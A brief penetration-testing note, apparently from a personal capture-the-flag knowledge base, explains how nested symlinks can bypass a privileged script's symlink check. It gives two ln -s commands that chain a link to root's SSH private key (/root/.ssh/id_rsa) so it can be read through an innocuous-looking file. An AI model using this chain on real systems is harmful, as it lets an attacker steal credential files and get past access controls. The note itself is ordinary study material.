Symlinks can be nested. Recall that symlinks do NOT point to an inode, but to a file. As such, we can use multiple symlinks together

Example
```
# NOTE: absolute paths are preferable...

ln -s /root/.ssh/id_rsa /home/<user>/evil.txt
ln -s /home/<user>/evil.txt /home/<user>/evil.png
```

thus if we cat evil.png, we obtain id_rsa

useful if we have access to privileged scripts but sanitize for symlinks. Nested sometimes provides a workaround
	see [[LinkVortex]]
